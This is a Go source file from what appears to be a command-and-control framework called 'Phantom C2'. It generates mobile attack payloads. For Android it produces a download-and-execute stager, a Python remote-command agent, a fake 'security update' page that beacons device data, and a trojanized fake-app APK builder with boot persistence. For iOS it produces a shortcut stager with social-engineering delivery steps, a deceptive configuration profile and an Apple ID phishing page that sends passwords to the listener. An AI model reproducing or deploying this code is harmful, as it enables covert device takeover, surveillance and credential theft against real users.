package payloads

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"text/template"
)

// ════════════════════════════════════════════════════════
//  ANDROID PAYLOADS
// ════════════════════════════════════════════════════════

// GenerateAndroidPayload creates an Android reverse shell APK source or stager.
func GenerateAndroidPayload(listenerURL, outputDir string) (string, error) {
	if outputDir == "" {
		outputDir = "build/payloads"
	}
	os.MkdirAll(outputDir, 0755)

	// 1. Generate a Bash-based Android stager (runs via Termux or adb shell)
	bashStager := fmt.Sprintf(`#!/system/bin/sh
# Phantom C2 — Android Stager
# Deploy via: adb push stager.sh /data/local/tmp/ && adb shell sh /data/local/tmp/stager.sh
# Or run inside Termux

URL="%s/api/v1/update"
TMP="/data/local/tmp/.phantom"

# Download agent
if command -v curl >/dev/null 2>&1; then
    curl -sk -o "$TMP" "$URL"
elif command -v wget >/dev/null 2>&1; then
    wget --no-check-certificate -q -O "$TMP" "$URL"
fi

if [ -f "$TMP" ]; then
    chmod 755 "$TMP"
    nohup "$TMP" >/dev/null 2>&1 &
fi
`, listenerURL)

	bashPath := filepath.Join(outputDir, "android_stager.sh")
	os.WriteFile(bashPath, []byte(bashStager), 0755)

	// 2. Generate a Python-based Android payload (for Termux with Python)
	pythonPayload := fmt.Sprintf(`#!/usr/bin/env python3
# Phantom C2 — Android Agent (Termux)
# Install: pkg install python && python3 android_agent.py

import socket, subprocess, os, time, ssl, urllib.request, json, base64

C2_URL = "%s"

def get_device_info():
    info = {}
    try:
        info['hostname'] = subprocess.check_output(['getprop', 'ro.product.model'], text=True).strip()
    except:
        info['hostname'] = 'android-device'
    try:
        info['os_version'] = subprocess.check_output(['getprop', 'ro.build.version.release'], text=True).strip()
    except:
        info['os_version'] = 'unknown'
    info['username'] = os.environ.get('USER', 'shell')
    return info

def reverse_shell():
    """Simple reverse shell fallback"""
    while True:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            # Check in with C2
            info = get_device_info()
            data = json.dumps(info).encode()
            req = urllib.request.Request(C2_URL + '/api/v1/status', data=data,
                                       headers={'Content-Type': 'application/json',
                                               'User-Agent': 'Android/' + info.get('os_version', '')})
            resp = urllib.request.urlopen(req, context=ctx, timeout=30)

            # Process response (tasks)
            resp_data = resp.read()
            if resp_data:
                try:
                    tasks = json.loads(resp_data)
                    for task in tasks if isinstance(tasks, list) else []:
                        if task.get('type') == 'shell':
                            cmd = task.get('args', ['echo ok'])[0]
                            output = subprocess.check_output(cmd, shell=True, text=True, timeout=60)
                            print(output)
                except:
                    pass

        except Exception as e:
            pass

        time.sleep(10)

if __name__ == '__main__':
    reverse_shell()
`, listenerURL)

	pythonPath := filepath.Join(outputDir, "android_agent.py")
	os.WriteFile(pythonPath, []byte(pythonPayload), 0755)

	// 3. Generate an Android HTML/JS payload (phishing — opens in browser)
	htmlPayload := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>System Update Required</title>
<style>
body { font-family: -apple-system, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
.card { background: white; border-radius: 12px; padding: 24px; max-width: 400px; margin: 40px auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
.icon { font-size: 48px; text-align: center; margin-bottom: 16px; }
h2 { text-align: center; color: #333; }
p { color: #666; text-align: center; line-height: 1.6; }
.btn { display: block; width: 100%%; background: #4CAF50; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 16px; cursor: pointer; margin-top: 20px; }
</style>
</head>
<body>
<div class="card">
<div class="icon">🔄</div>
<h2>Security Update</h2>
<p>A critical security update is available for your device. Please install it to keep your device protected.</p>
<a href="%s/api/v1/update" download="SystemUpdate.apk"><button class="btn">Install Update</button></a>
</div>
<script>
// Collect device info and beacon
fetch('%s/api/v1/status', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    ua: navigator.userAgent,
    platform: navigator.platform,
    lang: navigator.language,
    screen: screen.width + 'x' + screen.height
  })
}).catch(function(){});
</script>
</body>
</html>`, listenerURL, listenerURL)

	htmlPath := filepath.Join(outputDir, "android_update.html")
	os.WriteFile(htmlPath, []byte(htmlPayload), 0644)

	// 4. Generate Android APK build script (creates a reverse-shell APK)
	apkBuild := fmt.Sprintf(`#!/bin/bash
# Phantom C2 — Android APK Builder
# Requires: Android SDK, Java JDK, apktool
#
# This script creates a fake app (Calculator/Flashlight/etc.)
# that contains a reverse shell callback to the C2 server.

C2_URL="%s"
APP_NAME="${1:-Calculator}"
PKG_NAME="com.utilities.${APP_NAME,,}"

echo "[*] Building Android APK: $APP_NAME"
echo "[*] C2 callback: $C2_URL"

# Create project structure
mkdir -p apk_build/smali/com/utilities/app
mkdir -p apk_build/res/layout
mkdir -p apk_build/res/values
mkdir -p apk_build/res/drawable

# AndroidManifest.xml with required permissions
cat > apk_build/AndroidManifest.xml << 'MANIFEST'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="PACKAGE_NAME">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <application
        android:label="APP_LABEL"
        android:icon="@drawable/ic_launcher"
        android:allowBackup="true">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name=".PhantomService" android:exported="false"/>
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
MANIFEST

sed -i "s|PACKAGE_NAME|$PKG_NAME|g" apk_build/AndroidManifest.xml
sed -i "s|APP_LABEL|$APP_NAME|g" apk_build/AndroidManifest.xml

# Create the main Java source (reverse shell service)
cat > apk_build/MainActivity.java << 'JAVASRC'
package PACKAGE_NAME;

import android.app.*;
import android.os.*;
import android.content.*;
import java.net.*;
import java.io.*;
import javax.net.ssl.*;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle saved) {
        super.onCreate(saved);
        // Start background service
        startService(new Intent(this, PhantomService.class));
    }
}

class PhantomService extends Service {
    private String c2url = "C2_SERVER_URL";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            while (true) {
                try {
                    // Disable SSL verification
                    TrustManager[] trust = new TrustManager[]{new X509TrustManager() {
                        public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
                        public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() { return null; }
                    }};
                    SSLContext sc = SSLContext.getInstance("TLS");
                    sc.init(null, trust, new java.security.SecureRandom());
                    HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());

                    URL url = new URL(c2url + "/api/v1/status");
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setDoOutput(true);

                    // Send device info
                    String info = "{\"hostname\":\"" + Build.MODEL + "\",\"username\":\"android\",\"os\":\"android\"}";
                    conn.getOutputStream().write(info.getBytes());

                    // Read response (tasks)
                    BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String response = br.readLine();
                    br.close();

                    // Execute shell commands from response
                    if (response != null && response.contains("shell")) {
                        // Parse and execute
                        Process p = Runtime.getRuntime().exec(new String[]{"/system/bin/sh", "-c", "id"});
                        BufferedReader pr = new BufferedReader(new InputStreamReader(p.getInputStream()));
                        String output = pr.readLine();
                        pr.close();
                    }

                } catch (Exception e) {}

                try { Thread.sleep(10000); } catch (Exception e) {}
            }
        }).start();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}

class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        ctx.startService(new Intent(ctx, PhantomService.class));
    }
}
JAVASRC

sed -i "s|PACKAGE_NAME|$PKG_NAME|g" apk_build/MainActivity.java
sed -i "s|C2_SERVER_URL|$C2_URL|g" apk_build/MainActivity.java

echo "[+] APK project created in apk_build/"
echo "[*] To compile:"
echo "    1. Install Android SDK + apktool"
echo "    2. javac -source 1.8 -target 1.8 apk_build/MainActivity.java"
echo "    3. dx --dex --output=classes.dex apk_build/*.class"
echo "    4. apktool b apk_build -o $APP_NAME.apk"
echo "    5. jarsigner -keystore keystore.jks $APP_NAME.apk alias"
echo ""
echo "[*] Or use msfvenom: msfvenom -p android/meterpreter/reverse_https LHOST=C2_IP LPORT=443 -o $APP_NAME.apk"
`, listenerURL)

	apkPath := filepath.Join(outputDir, "android_apk_builder.sh")
	os.WriteFile(apkPath, []byte(apkBuild), 0755)

	return fmt.Sprintf("Android payloads generated:\n"+
		"  1. %s  — Shell stager (adb/Termux)\n"+
		"  2. %s  — Python agent (Termux)\n"+
		"  3. %s  — Phishing page (browser download)\n"+
		"  4. %s  — APK builder script (fake app with callback)\n",
		bashPath, pythonPath, htmlPath, apkPath), nil
}

// ════════════════════════════════════════════════════════
//  iOS PAYLOADS
// ════════════════════════════════════════════════════════

// GenerateIOSPayload creates iOS-targeted payloads.
// iOS is heavily sandboxed, so options are limited to:
// - Shortcut automation (Siri Shortcuts payload)
// - MDM profile (enterprise enrollment)
// - Web-based phishing (credential harvesting)
func GenerateIOSPayload(listenerURL, outputDir string) (string, error) {
	if outputDir == "" {
		outputDir = "build/payloads"
	}
	os.MkdirAll(outputDir, 0755)

	// 1. iOS Shortcut-based stager (exported as .shortcut file concept)
	shortcutPayload := fmt.Sprintf(`// Phantom C2 — iOS Shortcut Payload
// Create this as a Siri Shortcut on the target device:
//
// Step 1: "Get Contents of URL"
//   URL: %s/api/v1/status
//   Method: POST
//   Headers: Content-Type: application/json
//   Body: {"device":"iPhone","ts":"{{CurrentDate}}"}
//
// Step 2: "Get Dictionary Value" from result
//   Key: "command"
//
// Step 3: "Run Shell Script" (Jailbroken only)
//   Input: Dictionary Value
//
// For non-jailbroken: Use Shortcuts automation to run every hour
// via "Automation" > "Time of Day" > Run shortcut

// Social engineering delivery:
// 1. Create the shortcut
// 2. Share via iCloud link
// 3. Send to target: "Check out this cool shortcut"
`, listenerURL)

	shortcutPath := filepath.Join(outputDir, "ios_shortcut_instructions.txt")
	os.WriteFile(shortcutPath, []byte(shortcutPayload), 0644)

	// 2. MDM enrollment profile (installs config profile on device)
	mdmProfile := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.webClip.managed</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>PayloadIdentifier</key>
            <string>com.company.security.webclip</string>
            <key>PayloadUUID</key>
            <string>A1B2C3D4-E5F6-7890-ABCD-EF1234567890</string>
            <key>PayloadDisplayName</key>
            <string>Security Portal</string>
            <key>URL</key>
            <string>%s/api/v1/status</string>
            <key>Label</key>
            <string>Company Security</string>
            <key>IsRemovable</key>
            <true/>
            <key>FullScreen</key>
            <true/>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Company Security Profile</string>
    <key>PayloadIdentifier</key>
    <string>com.company.security</string>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadUUID</key>
    <string>F1E2D3C4-B5A6-9870-FEDC-BA0987654321</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
    <key>PayloadDescription</key>
    <string>Install this profile to enable company security features.</string>
</dict>
</plist>`, listenerURL)

	mdmPath := filepath.Join(outputDir, "ios_profile.mobileconfig")
	os.WriteFile(mdmPath, []byte(mdmProfile), 0644)

	// 3. iOS credential harvesting page (looks like Apple ID login)
	tmpl := `<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<title>Sign in with Apple ID</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'SF Pro', sans-serif; background: #f2f2f7; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
.container { width: 100%%; max-width: 380px; padding: 20px; }
.logo { text-align: center; margin-bottom: 20px; }
.logo svg { width: 44px; height: 44px; }
h1 { text-align: center; font-size: 22px; color: #1d1d1f; margin-bottom: 6px; }
.subtitle { text-align: center; color: #86868b; font-size: 14px; margin-bottom: 24px; }
.field { margin-bottom: 16px; }
.field input { width: 100%%; padding: 14px 16px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; background: white; outline: none; }
.field input:focus { border-color: #0071e3; }
.btn { width: 100%%; padding: 14px; background: #0071e3; color: white; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
.btn:hover { background: #0077ed; }
.footer { text-align: center; margin-top: 16px; }
.footer a { color: #0071e3; text-decoration: none; font-size: 14px; }
</style>
</head>
<body>
<div class="container">
<div class="logo"><svg viewBox="0 0 170 170" fill="#1d1d1f"><path d="M150.4 130.2c-2.4 5.5-5.2 10.6-8.4 15.2-4.4 6.4-8 10.8-10.8 13.3-4.3 4.1-8.9 6.2-13.8 6.3-3.5 0-7.8-1-12.7-3-5-2-9.6-3-13.8-3-4.4 0-9.1 1-14.1 3-5.1 2-9.2 3.1-12.3 3.2-4.7.2-9.4-1.9-14.1-6.3-3-2.7-6.8-7.3-11.2-13.9-4.8-7-8.7-15.2-11.8-24.4-3.3-10-5-19.6-5-28.8 0-10.7 2.3-19.9 6.9-27.5 3.6-6.1 8.4-10.9 14.4-14.4 6-3.5 12.5-5.3 19.5-5.5 3.8 0 8.7 1.2 14.8 3.4 6.1 2.3 10 3.4 11.7 3.4 1.3 0 5.5-1.3 12.7-4 6.8-2.5 12.5-3.5 17.2-3.1 12.7 1 22.3 6.1 28.6 15.2-11.4 6.9-17 16.5-16.8 28.9.2 9.6 3.6 17.6 10.1 23.9 3 2.8 6.3 5 10 6.6-.8 2.3-1.6 4.5-2.5 6.6z"/></svg></div>
<h1>Apple ID</h1>
<p class="subtitle">Sign in to continue to iCloud</p>
<form id="phish" method="POST">
<div class="field"><input type="email" name="email" placeholder="Apple ID" required autofocus></div>
<div class="field"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="btn">Sign In</button>
</form>
<div class="footer"><a href="#">Forgot Apple ID or Password?</a></div>
</div>
<script>
document.getElementById('phish').addEventListener('submit', function(e) {
  e.preventDefault();
  var data = {
    email: this.email.value,
    password: this.password.value,
    ua: navigator.userAgent,
    ts: new Date().toISOString()
  };
  fetch('{{.ListenerURL}}/api/v1/creds', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  }).then(function() {
    window.location = 'https://appleid.apple.com';
  }).catch(function() {
    window.location = 'https://appleid.apple.com';
  });
});
</script>
</body>
</html>`

	data := struct{ ListenerURL string }{listenerURL}
	t, _ := template.New("ios").Parse(tmpl)
	var buf strings.Builder
	t.Execute(&buf, data)

	phishPath := filepath.Join(outputDir, "ios_apple_login.html")
	os.WriteFile(phishPath, []byte(buf.String()), 0644)

	return fmt.Sprintf("iOS payloads generated:\n"+
		"  1. %s  — Shortcut automation guide\n"+
		"  2. %s  — MDM config profile (web clip)\n"+
		"  3. %s  — Apple ID phishing page\n",
		shortcutPath, mdmPath, phishPath), nil
}
